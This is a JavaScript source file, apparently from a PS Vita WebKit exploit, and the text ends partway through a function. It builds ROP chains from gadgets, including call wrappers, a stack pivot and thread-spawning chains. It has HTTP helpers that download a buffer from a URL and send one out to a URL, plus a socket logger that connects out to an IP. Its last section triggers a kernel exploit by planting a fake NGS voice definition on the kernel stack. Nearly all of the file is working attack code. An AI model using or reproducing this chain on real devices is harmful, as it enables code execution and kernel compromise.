window.old_fw = false;

var oldpsvita_payload = "";
var payload_buf = null;

var current_code_offset = 0;
var current_data_offset = 0;

window.current_payload_size = 0;
window.current_payload_code_offset = 0;
window.current_payload_data_offset = 0;

window.current_payload_base_addr = 0;
window.current_payload_code_addr = 0;
window.current_payload_data_addr = 0;

window.second_payload_base_addr = 0;
window.second_payload_size = 0x40000;
window.dumper_payload_base_addr = 0;
window.dumper_payload_size = 0x40000;

function p32(x) {
	x >>>= 0;
	return String.fromCharCode(x & 0xFFFF, x >>> 16);
}

function p16(x) {
	return String.fromCharCode(x & 0xFF, x >>> 8);
}

function payload_buf_read32(offset, val) {
	payload_buf.getUint32(offset, val, true);
}

function payload_buf_write32(offset, val) {
	payload_buf.setUint32(offset, val, true);
}

function push(val) {
	if (window.old_fw) {
		oldpsvita_payload += p32(val);
	} else {
		val >>>= 0;
		console.log("current_code_offset : 0x" + current_code_offset.toString(16) + ", val : 0x" + val.toString(16));
		payload_buf_write32(window.current_payload_code_offset + current_code_offset, val);
	}
	current_code_offset += 4;
}

function malloc_data_storage(size) {
	console.log("current_data_offset : 0x" + current_data_offset.toString(16) + ", size : 0x" + size.toString(16));
	var ret = window.current_payload_data_addr + current_data_offset;
	current_data_offset += size;
	return ret;
}

function init_payload(base_addr, code_offset, data_offset, max_size) {	
	current_code_offset = 0;
	current_data_offset = 0;
	window.current_payload_size = max_size;
	
	if (window.old_fw) {
		window.current_payload_data_addr = 0x88800000;
		
		oldpsvita_payload = "";
		
		init_data_storage();
	} else {
		window.current_payload_code_offset = code_offset;
		window.current_payload_data_offset = data_offset;
		
		window.current_payload_base_addr = base_addr;
		window.current_payload_code_addr = window.current_payload_base_addr + window.current_payload_code_offset;
		window.current_payload_data_addr = window.current_payload_base_addr + window.current_payload_data_offset;
		
		if (!payload_buf)
			payload_buf = new DataView(new ArrayBuffer(window.current_payload_size));

		for (var i=0; i < (window.current_payload_size / 4); i+=4)
			payload_buf_write32(i, 0);
		
		init_data_storage();
	}
}







var set_lr_ok = 0;

function set_lr_pop_pc() {
	if (set_lr_ok == 0) {
		push(window.pop_r4_pc);				// pc
		push(ldm_r4_data);					// r4
		push(window.ldm_r4_r1_r2_ip_lr_pc);	// pc

		set_lr_ok = 1;
	}
}

// call sceClibMemset(void *dst, char c, uint32_t len);
function _sceClibMemset(dst, c, len) {
	push(window.pop_r0_r1_pc);		// pc
	push(dst);				// r0
	push(0);				// r1
	push(window.pop_r1_r2_r3_pc);	// pc
	push(c);				// r1
	push(len);				// r2
	push(window.sceClibMemset);	// r3
	push(window.blx_r3_pop_r3_pc);	// pc
	push(0);				// r3

	set_lr_ok = 0;
}

// call sceClibStrncat(char *s1, const char *s2, size_t n);
function _sceClibStrncat(s1, s2, n) {
	push(window.pop_r0_r1_pc);		// pc
	push(s1);				// r0
	push(0);				// r1
	push(window.pop_r1_r2_r3_pc);	// pc
	push(s2);				// r1
	push(n);				// r2
	push(window.sceClibStrncat);	// r3
	push(window.blx_r3_pop_r3_pc);	// pc
	push(0);				// r3

	set_lr_ok = 0;
}

function _store(val, addr) {
	push(window.pop_r4_pc);		// pc
	push(val);				// r4
	push(window.pop_r3_pc);		// pc
	push(addr);				// r3
	push(window.str_r4_r3_pop_r4_r5_r6_pc);// pc
	push(0);				// r4
	push(0);				// r5
	push(0);				// r6
}

function store(val, addr) {
	set_lr_pop_pc();

	push(window.pop_r0_r1_pc);		// pc
	push(val);				// r0
	push(addr);				// r1
	push(window.str_r0_r1_bx_lr);	// pc


/*
	push(pop_r4_pc);			// pc
	push(addr);					// r4
	push(pop_r3_pc);			// pc
	push(val);					// r3
	push(str_r3_r4_add_sp_0x10_pop_r4_pc);	// pc
	push(0);					// dummy
	push(0);					// dummy
	push(0);					// dummy
	push(0);					// dummy
	push(0);					// r4
*/
}

function _strh(val, addr){
	push(window.pop_r1_pc);			// pc
	push(val);					// r1
	push(window.pop_r4_pc);			// pc
	push(addr);					// r4
	push(window.strh_r1_r4_pop_r4_pc);	// pc
	push(0);					// r4
}

function strh(val, addr) {
	set_lr_pop_pc();

	push(window.pop_r1_r2_r3_pc);	// pc
	push(addr);				// r1
	push(val);				// r2
	push(0);				// r3
	push(window.strh_r2_r1_bx_lr);	// pc

/*
	push(pop_r1_pc);		// pc
	push(val);				// r1
	push(pop_r4_pc);		// pc
	push(addr);				// r4
	push(strh_r1_r4_pop_r4_pc);	// pc
	push(0);				// r4
*/
}

function _strb(val, addr){
	push(window.pop_r0_r1_pc);		// pc
	push(addr);				// r0
	push(0);				// r1
	push(window.pop_r4_pc);		// pc
	push(val);				// r4
	push(window.strb_r4_r0_pop_r4_pc);	// pc
	push(0);				// r4
}

function strb(val, addr) {
	set_lr_pop_pc();
	
	push(window.pop_r1_r2_r3_pc);	// pc
	push(0);				// r1
	push(addr);				// r2
	push(val);				// r3
	push(window.strb_r3_r2_bx_lr);	// pc


/*
	push(pop_r0_r1_pc);		// pc
	push(addr);				// r0
	push(0);				// r1
	push(pop_r4_pc);		// pc
	push(val);				// r4
	push(strb_r4_r0_pop_r4_pc);	// pc
	push(0);				// r4
*/
}

function SaveR0ToAddr(addr) {
	push(window.pop_r4_pc);			// pc
	push(addr);					// r4
	push(window.str_r0_r4_pop_r4_pc);	// pc
	push(0);					// r4
}

function RestoreFromAddrToR0(addr) {
	push(window.pop_r0_r1_pc);			// pc
	push(addr);					// r0
	push(0);					// r1
	push(window.ldr_r0_r0_pop_r4_pc);	// pc
	push(0);					// r4
}

function addToR0(add_val) {
	push(window.pop_r1_pc);							// pc
	push(add_val);									// r1
	push(window.add_r0_r1_add_sp_8_pop_r4_pc);		// pc
	push(0);										// for sp?
	push(0);										// for sp?
	push(0);										// r4
}

function load_add_store(dst, src, add_val) {
	push(window.pop_r0_r1_pc);				// pc
	push(src);						// r0
	push(0);						// r1
	push(window.ldr_r0_r0_pop_r4_pc);		// pc
	push(add_val);					// r4
	push(window.adds_r0_r0_r4_pop_r3_r4_r5_pc);	// pc
	push(0);						// r3
	push(dst);						// r4
	push(0);						// r5
	push(window.str_r0_r4_pop_r4_pc);		// pc
	push(0);						// r4
}

function RopStrcpy(dst, s) {
	var len = s.length;
	var stridx = 0;
	var dat = 0;

	while ((dst & 3) != 0) {
		dat = s.charCodeAt(stridx + 0);
		stridx++;
		_strb(dat, dst);
		dst += 1;
		len -= 1;
	}

	while (len >= 4) {
		dat = (s.charCodeAt(stridx + 0) << 0) | (s.charCodeAt(stridx + 1) << 8) | (s.charCodeAt(stridx + 2) << 16) | (s.charCodeAt(stridx + 3) << 24);
		stridx += 4;
		_store(dat, dst);
		dst += 4;
		len -= 4;
	}

	if (len & 2) {
		dat = (s.charCodeAt(stridx + 0) << 0) | (s.charCodeAt(stridx + 1) << 8);
		stridx += 2;
		_strh(dat, dst);
		dst += 2;
	}

	if (len & 1) {
		dat = (s.charCodeAt(stridx + 0) << 0);
		stridx += 1;
		_strb(dat, dst);
		dst += 1;
	}
}

function RopStrcpy2(dst, s) {
	for (var i=0; i<s.length; i++)
		_strb(dst+i, s.charCodeAt(i));
}

function SetIp(r12) {
	push(window.pop_r0_r1_pc);				// pc
	push(r12);						// r0
	push(0);						// r1
	push(window.mov_ip_r0_mov_r0_ip_add_sp_0xC_pop_r4_r5_pc);	// pc
	push(0);						// dummy
	push(0);						// dummy
	push(0);						// dummy
	push(0);						// r4
	push(0);						// r5
}

// CALL wrappers

function call_vv(function_addr, a1, a2) {
	push(window.pop_r0_r1_pc);		// pc
	push(a1);				// r0
	push(a2);				// r1
	push(window.pop_r4_pc);		// pc
	push(function_addr);	// r4
	push(window.blx_r4_pop_r4_pc);	// pc
	push(0);				// r4

	set_lr_ok = 0;
}

function call_v(function_addr, a1) {
	call_vv(function_addr, a1, 0);
}

function call_lvvv(function_addr, a1, a2, a3, a4) {
	push(window.pop_r0_r1_pc);			// pc
	push(a1);					// r0
	push(0);					// r1
	push(window.ldr_r0_r0_pop_r4_pc);	// pc
	push(function_addr);		// r4
	push(window.pop_r1_r2_r3_pc);		// pc
	push(a2);					// r1
	push(a3);					// r2
	push(a4);					// r3
	push(window.blx_r4_pop_r4_pc);		// pc
	push(0);					// r4

	set_lr_ok = 0;
}

function call_lvv(function_addr, a1, a2, a3) {
	call_lvvv(function_addr, a1, a2, a3, 0);
}

function call_lv(function_addr, a1, a2) {
	push(window.pop_r0_r1_pc);			// pc
	push(a1);					// r0
	push(a2);					// r1
	push(window.ldr_r0_r0_pop_r4_pc);	// pc
	push(function_addr);		// r4
	push(window.blx_r4_pop_r4_pc);		// pc
	push(0);					// r4

	set_lr_ok = 0;

	//call_lvv(function_addr, a1, a2, 0); // commented by Princess
}

function call_l(function_addr, a1) {
	call_lv(function_addr, a1, 0);
}

function call_vvvv(function_addr, a1, a2, a3, a4) {
	push(window.pop_r0_r1_pc);		// pc
	push(a1);				// r0
	push(0);				// r1
	push(window.pop_r1_r2_r3_pc);	// pc
	push(a2);				// r1
	push(a3);				// r2
	push(a4);				// r3
	push(window.pop_r4_pc);		// pc
	push(function_addr);	// r4
	push(window.blx_r4_pop_r4_pc);	// pc
	push(0);				// r4

	set_lr_ok = 0;
}

function call_vvv(function_addr, a1, a2, a3) {
	call_vvvv(function_addr, a1, a2, a3, 0);
}

function call_vvvl(function_addr, r0, r1, r2, r3) {
	push(window.pop_r1_r2_r3_pc);						// pc
	push(0);									// r1
	push(r2);									// r2
	push(0);									// r3
	RestoreFromAddrToR0(r3);					// pc
	push(window.adds_r3_r0_0_adds_r0_r3_0_pop_r4_pc);	// pc
	push(function_addr);						// r4
	push(window.pop_r0_r1_pc);							// pc
	push(r0);									// r0
	push(r1);									// r1
	push(window.blx_r4_pop_r4_pc);						// pc
	push(0);									// r4

	set_lr_ok = 0;
}

function call_vvvvvvv(function_addr, r0, r1, r2, r3, sp00, sp04, sp08) {
	push(window.pop_r0_r1_pc);						// pc
	push(r0);								// r0
	push(0);								// r1
	push(window.pop_r1_r2_r3_pc);					// pc
	push(r1);								// r1
	push(r2);								// r2
	push(r3);								// r3
	push(window.pop_r4_pc);						// pc
	push(function_addr);					// r4
	push(window.blx_r4_add_sp_0xC_pop_r4_r5_pc);	// pc
	push(sp00);								// on stack
	push(sp04);								// on stack
	push(sp08);								// on stack
	push(0);								// r4
	push(0);								// r5

	set_lr_ok = 0;
}

function call_vvvvvv(function_addr, r0, r1, r2, r3, sp00, sp04) {
	call_vvvvvvv(function_addr, r0, r1, r2, r3, sp00, sp04, 0);
}

function call_rvvvvvv(function_addr, r1, r2, r3, sp00, sp04, sp08) {
	push(window.pop_r1_r2_r3_pc);					// pc
	push(r1);								// r1
	push(r2);								// r2
	push(r3);								// r3
	push(window.pop_r4_pc);						// pc
	push(function_addr);					// r4
	push(window.blx_r4_add_sp_0xC_pop_r4_r5_pc);	// pc
	push(sp00);								// on stack
	push(sp04);								// on stack
	push(sp08);								// on stack
	push(0);								// r4
	push(0);								// r5

	set_lr_ok = 0;
}

function call_rvvvvv(function_addr, r1, r2, r3, sp00, sp04) {
	call_rvvvvvv(function_addr, r1, r2, r3, sp00, sp04, 0);
}

function call_rvvvv(function_addr, r1, r2, r3, sp00) {
	call_rvvvvvv(function_addr, r1, r2, r3, sp00, 0, 0);
}

function call_rvvv(function_addr, r1, r2, r3) {
	call_rvvvvvv(function_addr, r1, r2, r3, 0, 0, 0);
}

function call_rvv(function_addr, r1, r2) {
	call_rvvvvvv(function_addr, r1, r2, 0, 0, 0, 0);
}

function call_rv(function_addr, r1) {
	call_rvvvvvv(function_addr, r1, 0, 0, 0, 0, 0);
}

function call_r(function_addr) {
	push(window.pop_r4_pc);			// pc
	push(function_addr);			// r4
	push(window.blx_r4_pop_r4_pc);	// pc
	push(0);						// r4

	set_lr_ok = 0;
}

function call_vvvvv(function_addr, r0, r1, r2, r3, sp00) {
	call_vvvvvv(function_addr, r0, r1, r2, r3, sp00, 0, 0);
}

function call_vl(function_addr, a1, a2) {
	push(window.pop_r0_r1_pc);		// pc
	push(a1);				// r0
	push(0);				// r1
	push(window.pop_r4_r5_pc);		// pc
	push(a2);				// r4
	push(window.pop_pc);			// r5
	push(window.ldr_r1_r4_blx_r5);	// pc
	push(window.pop_r4_pc);		// pc
	push(function_addr);	// r4
	push(window.blx_r4_pop_r4_pc);	// pc
	push(0);				// r4

	set_lr_ok = 0;
}

/*
var rewrite_rop_offset1;
var rewrite_rop_offset2;

function rewrite_mark1() {
	rewrite_rop_offset1 = offset - 0xC;
}

function rewrite_mark2() {
	rewrite_rop_offset2 = offset - 4;
}

function rewrite_offset() {
	var val = 0;

	val = payload_buf_read32(rewrite_rop_offset1);

	console.log("rewrite_rop_offset1 val : " + rewrite_rop_offset1.toString(16));

	console.log("old val : " + val.toString(16));

	val += rewrite_rop_offset2;

	console.log("new val : " + val.toString(16));

	payload_buf_write32(rewrite_rop_offset1, val);
}
*/

function load_call_vv(function_addr, a1, a2) {
	push(window.pop_r0_r1_pc);							// pc
	push(function_addr);						// r0
	push(0);									// r1
	push(window.ldr_r0_r0_pop_r4_pc);					// pc
	push(0);									// r4
	push(window.adds_r3_r0_0_adds_r0_r3_0_pop_r4_pc);	// pc
	push(0);									// r4
	push(window.pop_r0_r1_pc);							// pc
	push(a1);									// r0
	push(a2);									// r1
	push(window.blx_r3_pop_r3_pc);						// pc
	push(0);									// r3

	set_lr_ok = 0;
}

function load_call_llvv(function_addr, a1, a2, a3, a4) {
	SetIp(pop_pc);

	push(window.pop_r0_r1_pc);							// pc, set function_addr to r5
	push(function_addr);						// r0
	push(window.ptr_pop_pc);							// r1
	push(window.ldr_r0_r0_pop_r4_pc);					// pc
	push(0);									// r4
	push(window.adds_r3_r0_0_adds_r0_r3_0_pop_r4_pc);	// pc
	push(0);									// r4
	push(window.mov_r4_r3_ldr_r2_r1_blx_r2);			// pc
	push(window.mov_r5_r4_blx_ip);						// pc
	push(window.pop_r0_r1_pc);							// pc, set a1 to r0
	push(a1);									// r0
	push(0);									// r1
	push(window.ldr_r0_r0_pop_r4_pc);					// pc
	push(0);									// r4
	push(window.pop_r1_r2_r3_pc);						// pc, set arg3 and arg4
	push(0);									// r1
	push(a3);									// r2
	push(a4);									// r3
	push(window.pop_r4_pc);							// pc, set a2 to r1
	push(a2-4);									// r4
	push(window.ldr_r1_r4_0x4_blx_ip);					// pc
	push(window.blx_r5_pop_r4_r5_r6_pc);				// pc
	push(0);									// r4
	push(0);									// r5
	push(0);									// r6

	set_lr_ok = 0;
}

function _load_call_lvvv(function_addr, a1, a2, a3, a4) {
	RestoreFromAddrToR0(function_addr);	// pc
	SaveR0ToAddr(window.current_payload_code_addr);		// pc
	rewrite_mark1();
	RestoreFromAddrToR0(a1);			// pc
	push(window.pop_r1_r2_r3_pc);				// pc
	push(a2);							// r1
	push(a3);							// r2
	push(a4);							// r3
	push(window.pop_r4_pc);					// pc
	push(0);							// r4
	rewrite_mark2();
	rewrite_offset();
	push(window.blx_r4_pop_r4_pc);				// pc
	push(0);							// r4

	set_lr_ok = 0;
}

function load_call_lvvv(function_addr, a1, a2, a3, a4) {
	SetIp(pop_pc);

	push(window.pop_r0_r1_pc);					// pc, set function_addr to r5
	push(function_addr);				// r0
	push(window.ptr_pop_pc);					// r1
	push(window.ldr_r0_r0_pop_r4_pc);			// pc
	push(0);							// r4
	push(window.adds_r3_r0_0_adds_r0_r3_0_pop_r4_pc);	// pc
	push(0);							// r4
	push(window.mov_r4_r3_ldr_r2_r1_blx_r2);	// pc
	push(window.mov_r5_r4_blx_ip);				// pc
	push(window.pop_r4_pc);					// pc
	var rewrite_offset_s = offset;
	push(0);							// r4
	push(window.pop_r0_r1_pc);					// pc
	push(window.blx_r5_pop_r4_r5_r6_pc);		// r0
	push(0);							// r1
	push(window.str_r0_r4_pop_r4_pc);			// pc
	push(0);							// r4
	push(window.pop_r0_r1_pc);					// pc, set a1 to r0
	push(a1);							// r0
	push(0);							// r1
	push(window.ldr_r0_r0_pop_r4_pc);			// pc
	push(0);							// r4
	push(window.pop_r1_r2_r3_pc);				// pc, set arg2 and arg3, arg4
	push(a2);							// r1
	push(a3);							// r2
	push(a4);							// r3
	push(window.add_sp_0x2C_pop_pc);			// pc
	push(0);							// dummy, 0x00
	push(0);							// dummy, 0x04
	push(0);							// dummy, 0x08
	push(0);							// dummy, 0x0C
	push(0);							// dummy, 0x10
	push(0);							// dummy, 0x14
	push(0);							// dummy, 0x18
	push(0);							// dummy, 0x1C
	push(0);							// dummy, 0x20
	push(0);							// dummy, 0x24
	push(0);							// dummy, 0x28
	payload_buf_write32(rewrite_offset_s, window.current_payload_code_addr + offset);
	push(0);							// pc
	push(0);							// r4
	push(0);							// r5
	push(0);							// r6

	set_lr_ok = 0;
}

function load_call_lvv(function_addr, a1, a2, a3) {
	load_call_lvvv(function_addr, a1, a2, a3, 0);
}

function load_call_lv(function_addr, a1, a2) {
	push(window.pop_r0_r1_pc);							// pc
	push(function_addr);						// r0
	push(0);									// r1
	push(window.ldr_r0_r0_pop_r4_pc);					// pc
	push(0);									// r4
	push(window.adds_r3_r0_0_adds_r0_r3_0_pop_r4_pc);	// pc
	push(0);									// r4
	push(window.pop_r0_r1_pc);							// pc
	push(a1);									// r0
	push(a2);									// r1
	push(window.ldr_r0_r0_pop_r4_pc);					// pc
	push(0);									// r4
	push(window.blx_r3_add_sp_0xC_pop_pc);				// pc
	push(0);									// dummy, 0x00
	push(0);									// dummy, 0x04
	push(0);									// dummy, 0x08

	set_lr_ok = 0;

	//load_call_lvv(function_addr, a1, a2, 0, 0); // princess commented this
}

function load_call_vvvv(function_addr, a1, a2, a3, a4) {
	RestoreFromAddrToR0(function_addr);
	push(window.pop_r3_pc);					// pc
	push(window.pop_pc);					// r3
	push(window.mov_r4_r0_blx_r3);			// pc
	push(window.pop_r0_r1_pc);				// pc
	push(a1);								// r0
	push(0);								// r1
	push(window.pop_r1_r2_r3_pc);			// pc
	push(a2);								// r1
	push(a3);								// r2
	push(a4);								// r3
	push(window.blx_r4_pop_r4_pc);			// pc
	push(0);								// r4

	set_lr_ok = 0;
}

function pivot(rop_chain_addr, temp_ldm_r1_data_addr) {
	_store(0,				temp_ldm_r1_data_addr + 0x00); // r0
	_store(0,				temp_ldm_r1_data_addr + 0x04); // r7
	_store(0,				temp_ldm_r1_data_addr + 0x08); // ip
	_store(rop_chain_addr,	temp_ldm_r1_data_addr + 0x0C); // sp
	_store(window.pop_pc,	temp_ldm_r1_data_addr + 0x10); // pc

	push(window.pop_r1_r2_r3_pc);	// pc
	push(temp_ldm_r1_data_addr);	// r1
	push(0);						// r2
	push(0);						// r3

	push(window.ldm_r1_r0_r7_ip_sp_pc);
}

function run_in_thread(rop_chain_addr, temp_ldm_r1_data_addr) {
	_sceClibMemset(free_text_area, 0, 0x400);
	RopStrcpy(free_text_area, "rop_in_thread");
	call_vvvvvvv(window.sceKernelCreateThread, free_text_area, window.ldm_r1_r0_r7_ip_sp_pc, 0x10000100, 0x1000, 0, 0, 0);
	SaveR0ToAddr(free_area);
	
	_store(0,					temp_ldm_r1_data_addr + 0x00); // r0
	_store(0,					temp_ldm_r1_data_addr + 0x04); // r7
	_store(0,					temp_ldm_r1_data_addr + 0x08); // ip
	_store(rop_chain_addr,		temp_ldm_r1_data_addr + 0x0C); // sp
	_store(window.pop_pc,		temp_ldm_r1_data_addr + 0x10); // pc
	
	RestoreFromAddrToR0(free_area);
	call_rvv(window.sceKernelStartThread, 5*4, temp_ldm_r1_data_addr); // r1 will contain ptr to a copy of PIVOT_SETUP
}


var NULL = 0;

var	SCE_NGS_VOICE_DEFINITION_XOR	= 0x9e28dcce,
	SCE_NGS_VOICE_DEFINITION_MAGIC	= 0x66647662,
	SCE_NGS_VOICE_DEFINITION_FLAGS	= 0x00010001,
	SCE_NGS_ERROR_INVALID_PARAM		= 0x804a0002,

	PRESET_LIST_OFFSET		= 0x130,
	FAKE_COPYOUT_OFFSET		= 0x40,
	FAKE_COPYOUT_SIZE		= 0xA0,
	COPYOUT_PARAMS_OFFSET	= 0xA0,

	KSTACK_DEVCTL_INDATA_OFFSET	= 0x700,	// 3.15

	KSTACK_SIZE				= 0x1000,
	KSTACK_SYSMEM_OFFSET	= 0x89C,
	SCE_SYSMEM_OFFSET		= -0x117eb,

	KSTACK_BASE_START		= 0x1000,
	KSTACK_BASE_STEP		= 0x1000,

	SCE_OK					= 0x0;

function init_data_storage() {
	window.ptr_pop_pc				= malloc_data_storage(0x4); // use 0x4 byte
	window.ldm_r4_data				= malloc_data_storage(0x14); // use  0x14 byte
	
	window.free_text_area			= malloc_data_storage(0x400); // use 0x400 byte
	window.free_area				= malloc_data_storage(0x400); // use 0x400 byte
	
	window.SocketAddr				= malloc_data_storage(0x10); // use 0x10 byte
	window.SocketId					= malloc_data_storage(0x30); // use 0x4 byte, rev 0x2C byte
	window.RopSocket_str			= malloc_data_storage(0xC0); // use 0xC0 byte
	window.send_str					= malloc_data_storage(0x400); // use 0x400 byte
	
	window.modnum					= malloc_data_storage(0x4); // use 0x4 byte
	window.mod_info					= malloc_data_storage(0x1B8); // use 0x1B8 byte
	window.modlist					= malloc_data_storage(0x400); // use 0x400 byte, sizeof(SceUID): 4 * 0x100 = 0x400
	
	window.app_util_init_param		= malloc_data_storage(0x40); // use  0x40 byte
	window.app_util_boot_param		= malloc_data_storage(0x28); // use  0x28 byte
	
	window.sceNgsSystemGetRequiredMemorySize	= malloc_data_storage(0x4); // use 0x4 byte
	window.sceNgsSystemInit						= malloc_data_storage(0x4); // use 0x4 byte
	window.sceNgsRackGetRequiredMemorySize		= malloc_data_storage(0x4); // use 0x4 byte
	window.sceNgsRackInit						= malloc_data_storage(0x4); // use 0x4 byte
	window.sceNgsRackRelease					= malloc_data_storage(0x4); // use 0x4 byte

	window.ngs_system_init_params	= malloc_data_storage(0x14); // use 0x14 byte
	window.paramsize				= malloc_data_storage(0x4); // use   0x4 byte
	window.s_pSysMem				= malloc_data_storage(0x4); // use   0x4 byte
	window.ngs_syshandle			= malloc_data_storage(0x4); // use   0x4 byte
	window.rackDesc					= malloc_data_storage(0x18); // use  0x18 byte
	window.voiceDef					= malloc_data_storage(0x400); // use 0x400 byte
	window.rack_handle				= malloc_data_storage(0x4); // use   0x4 byte
	window.buffer_info				= malloc_data_storage(0x8); // use   0x8 byte

	window.buf_sceIoDevctl			= malloc_data_storage(0x400); // use 0x400 byte
	
	window.kstack_addr				= malloc_data_storage(0x4); // use   0x4 byte

	window.ldm_r1_data				= malloc_data_storage(0x14); // use  0x14 byte
	window.ldm_r1_data_addr			= malloc_data_storage(0x8); // use   0x8 byte

	window.kmemory_copy_area		= malloc_data_storage(0x80); // use  0x80 byte
}

// HTTP

function http_download_to_buf(rop_stack_vaddr, url, buf_addr, buf_size) {
	_sceClibMemset(rop_stack_vaddr, 0, 0x4000);
	
	var useragent_vaddr = rop_stack_vaddr + 0x00;
	RopStrcpy(useragent_vaddr, "PsVitaWebkitExploit");

	// call tpl = sceHttpCreateTemplate(useragent_vaddr, 2, 1);
	call_vvv(window.sceHttpCreateTemplate, useragent_vaddr, 2, 1);

	var tpl_vaddr = rop_stack_vaddr + 0x2800;
	// save tpl
	SaveR0ToAddr(tpl_vaddr);

	var url_vaddr = rop_stack_vaddr + 0x80;
	RopStrcpy(url_vaddr, url);

	// call conn = sceHttpCreateConnectionWithURL(tpl, url, 0);
	RestoreFromAddrToR0(tpl_vaddr);
	call_rvv(window.sceHttpCreateConnectionWithURL, url_vaddr, 0);

	var conn_vaddr = rop_stack_vaddr + 0x2804;
	// save conn
	SaveR0ToAddr(conn_vaddr);
	

	// call req = sceHttpCreateRequestWithURL(conn, 0, url, 0);
	RestoreFromAddrToR0(conn_vaddr);
	call_rvvv(window.sceHttpCreateRequestWithURL, 0, url_vaddr, 0);

	var req_vaddr = rop_stack_vaddr + 0x2808;
	// save req
	SaveR0ToAddr(req_vaddr);

	// call sceHttpSendRequest(req, NULL, 0);
	RestoreFromAddrToR0(req_vaddr);
	call_rvv(window.sceHttpSendRequest, 0, 0);
	
	// call sceHttpReadData(req, buf, sizeof(buf));
	RestoreFromAddrToR0(req_vaddr);	
	call_rvv(window.sceHttpReadData, buf_addr, buf_size);
	
	// call sceHttpDeleteRequest(req);
	RestoreFromAddrToR0(req_vaddr);
	call_r(window.sceHttpDeleteRequest);
	
	// call sceHttpDeleteConnection(conn);
	RestoreFromAddrToR0(conn_vaddr);
	call_r(window.sceHttpDeleteConnection);
}

function http_send_buffer(rop_stack_vaddr, url, buf_addr, buf_size) {
	_sceClibMemset(rop_stack_vaddr, 0, 0x4000);
	
	var useragent_vaddr = rop_stack_vaddr + 0x00;
	RopStrcpy(useragent_vaddr, "PsVitaWebkitExploit");
	
	// call tpl = sceHttpCreateTemplate(useragent_vaddr, 2, 1);
	call_vvv(window.sceHttpCreateTemplate, useragent_vaddr, 2, 1);

	var tpl_vaddr = rop_stack_vaddr + 0x2800;
	// save tpl
	SaveR0ToAddr(tpl_vaddr);
	
	var url_vaddr = rop_stack_vaddr + 0x80;
	RopStrcpy(url_vaddr, url);

	// call conn = sceHttpCreateConnectionWithURL(tpl, url, 0);
	RestoreFromAddrToR0(tpl_vaddr);
	call_rvv(window.sceHttpCreateConnectionWithURL, url_vaddr, 0);

	var conn_vaddr = rop_stack_vaddr + 0x2804;
	// save conn
	SaveR0ToAddr(conn_vaddr);

	// call req = sceHttpCreateRequestWithURL(conn, 1, url_vaddr, 0, 0, 0x10000);
	RestoreFromAddrToR0(conn_vaddr);
	call_rvvvvv(window.sceHttpCreateRequestWithURL, 1, url_vaddr, 0, 0, 0x10000);

	var req_vaddr = rop_stack_vaddr + 0x2808;
	// save req
	SaveR0ToAddr(req_vaddr);

	// call sceHttpSendRequest(req, buf, sizeof(buf));
	RestoreFromAddrToR0(req_vaddr);	
	call_rvv(window.sceHttpSendRequest, buf_addr, buf_size);
	
	// call sceHttpDeleteRequest(req);
	RestoreFromAddrToR0(req_vaddr);
	call_r(window.sceHttpDeleteRequest);
	
	// call sceHttpDeleteConnection(conn);
	RestoreFromAddrToR0(conn_vaddr);
	call_r(window.sceHttpDeleteConnection);
}

// SOCKET

function network_ip_to_hex(ip_string) {
	var ipSegments = ip_string.split('.');
	
	for (var seg = 0; seg < 4; seg++)
		ipSegments[seg] = parseInt(ipSegments[seg]);
	
	return ipSegments[3] << 24 | ipSegments[2] << 16 | ipSegments[1] << 8 | ipSegments[0];
}

function network_port_to_hex(port_number) {
	return ((port_number & 0xFF00) >> 8) + ((port_number & 0xFF) << 8);
}

function init_socket(ip, port) {
	RopStrcpy(RopSocket_str, "RopSocket");
	_sceClibMemset(SocketAddr, 0, 0x10);
	_strb(0x10,							SocketAddr + 0x00);	// sin_len
	_strb(SCE_NET_AF_INET,				SocketAddr + 0x01);	// sin_family
	_strh(network_port_to_hex(port),	SocketAddr + 0x02);	// sin_port
	_store(network_ip_to_hex(ip),		SocketAddr + 0x04);	// sin_addr
	
	call_vvvv(window.sceNetSocket, RopSocket_str, window.SCE_NET_AF_INET, window.SCE_NET_SOCK_STREAM, 0);

	// save socket
	SaveR0ToAddr(SocketId);

	call_lvv(window.sceNetConnect, SocketId, SocketAddr, 0x10);
}

function close_socket() {
	call_l(sceNetSocketClose, SocketId);

	_sceClibMemset(send_str, 0, 0x400);
}

function send_socket_msg() {
	call_lvvv(sceNetSend, SocketId, send_str, 0x3FF, 0);
}

function send_log_vvvl(fmt, val) {
	_sceClibMemset(free_text_area, 0, 0x300);
	_sceClibMemset(send_str, 0, 0x400);

	RopStrcpy(free_text_area, fmt);
	call_vvvl(sceClibSnprintf, send_str, 0x300, free_text_area, val);

	send_socket_msg();
}

function send_log_vvvv(fmt, val) {
	_sceClibMemset(free_text_area, 0, 0x300);
	_sceClibMemset(send_str, 0, 0x400);

	RopStrcpy(free_text_area, fmt);
	call_vvvv(sceClibSnprintf, send_str, 0x300, free_text_area, val);

	send_socket_msg();
}

function send_module_info(modidx) {
	_store(128, modnum);
	call_vvv(sceKernelGetModuleList, 0xFF, modlist, modnum);
	call_lv(sceKernelGetModuleInfo, modlist + (4 * modidx), mod_info);
	
	//send_log_vvvl("// %s\n", mod_info + 0xC);
	/*send_log_vvvl("// text base 0x%08X\n", mod_info + 0x154 + 0x8);
	send_log_vvvl("// text size 0x%08X\n", mod_info + 0x154 + 0xC);
	send_log_vvvl("// data base 0x%08X\n", mod_info + 0x154 + 0x18 + 0x8);
	send_log_vvvl("// data size 0x%08X\n", mod_info + 0x154 + 0x18 + 0xC);
	*/
	//call_v(sceKernelDelayThread, 100 * 1000);
}


// NGS kernel exploit

function set_preset(i, src, size) {
	var index = i * 0x18;
	var offset = src - (PRESET_LIST_OFFSET + index);

	_sceClibMemset(voiceDef + (PRESET_LIST_OFFSET + index), 0, 0x18);

	_store(offset, voiceDef + (PRESET_LIST_OFFSET + index + 0x08));
	_store(size,   voiceDef + (PRESET_LIST_OFFSET + index + 0x0C));
}

function trigger_ngs_exploit() {
	// Plant fake voice definition into kernel stack
	call_vvvvvv(window.sceIoDevctl, empty_string, 0, voiceDef, 0x3ff, 0, 0);

	// Determine memory requirement for rack
	load_call_lvv(sceNgsRackGetRequiredMemorySize, ngs_syshandle, rackDesc, (buffer_info + 4));

	// Allocate rack memory
	call_vl(memalign, 256, buffer_info + 4);
	SaveR0ToAddr(buffer_info + 0);

	// Call vulnerable function
	load_call_lvvv(sceNgsRackInit, ngs_syshandle, buffer_info, rackDesc, rack_handle);

	SaveR0ToAddr(free_area);
	send_log_vvvl("// sceNgsRackInit   : 0x%08X\n", free_area);
	send_log_vvvl("// rack_handle      : 0x%08X\n", rack_handle);
	send_log_vvvl("// buffer_info.size : 0x%08X\n", (buffer_info + 4));

	// Free rack memory
